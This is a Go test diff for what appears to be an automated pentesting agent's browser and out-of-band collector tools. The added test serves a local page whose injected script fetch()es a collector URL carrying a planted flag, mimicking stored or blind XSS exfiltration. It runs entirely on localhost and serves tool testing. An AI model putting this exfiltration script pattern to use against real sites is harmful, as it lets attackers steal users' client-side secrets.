@@ -77,6 +77,54 @@ func TestBrowserRender_NoDialogOnBenign(t *testing.T) {
 	}
 }
 
+// TestBrowserOOBChain_CapturesFlagViaBeacon is the end-to-end proof of the load-bearing scenario the
+// two tools exist for: a page's injected script (stored/blind XSS) exfils a secret to the OOB
+// collector. It drives the REAL tool code — renderPage (headless Chrome) executes the page's script,
+// which fetch()es the minted OOB URL carrying a planted flag; the real Collector records it; oob_check
+// surfaces it. This is the chain that captures a flag when the flag is only reachable client-side
+// (unlike the XBOW "alert('XSS')" benchmarks, which are server-verified — flag via HTTP — and which
+// also fail to build on modern Docker due to PhantomJS). Skips cleanly without Chrome.
+func TestBrowserOOBChain_CapturesFlagViaBeacon(t *testing.T) {
+	requireBrowser(t)
+	const flag = "FLAG{browser_oob_chain_ok}"
+
+	col := NewCollector("127.0.0.1") // the REAL collector (oob.go)
+	if err := col.Start(); err != nil {
+		t.Fatalf("collector start: %v", err)
+	}
+	defer col.Stop()
+	beaconURL, token := col.Mint()
+
+	// a page whose script exfils a "stolen" secret to the collector — the stored/blind-XSS shape
+	page := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		fmt.Fprintf(w, `<html><body><script>fetch(%q + '?c=' + encodeURIComponent(%q));</script></body></html>`, beaconURL, flag)
+	}))
+	defer page.Close()
+
+	cc := &Context{Target: page.URL}
+	cc.req = NewRequester([]string{hostOf(page.URL)}, 5, 0)
+	cc.oob = col
+	cc.ctx = context.Background()
+	_ = tBrowserRender(cc, map[string]any{"url": page.URL}) // real browser runs the script → beacon fires
+
+	var hits []OOBHit
+	for i := 0; i < 40; i++ { // the beacon is async — poll briefly
+		if hits = col.Hits(token); len(hits) > 0 {
+			break
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+	if len(hits) == 0 {
+		t.Fatal("browser+OOB chain captured nothing — the rendered script's beacon never reached the collector")
+	}
+	if !strings.Contains(hits[0].Query, "browser_oob_chain_ok") {
+		t.Errorf("beacon did not carry the exfil'd flag: %q", hits[0].Query)
+	}
+	if out := tOOBCheck(cc, map[string]any{"token": token}); !strings.Contains(out, "browser_oob_chain_ok") {
+		t.Errorf("oob_check did not surface the captured flag to the agent: %s", out)
+	}
+}
+
 // TestBrowserRender_AllowlistGate: an off-scope URL is blocked WITHOUT launching a browser (the scope
 // guard runs first, so this needs no Chrome).
 func TestBrowserRender_AllowlistGate(t *testing.T) {
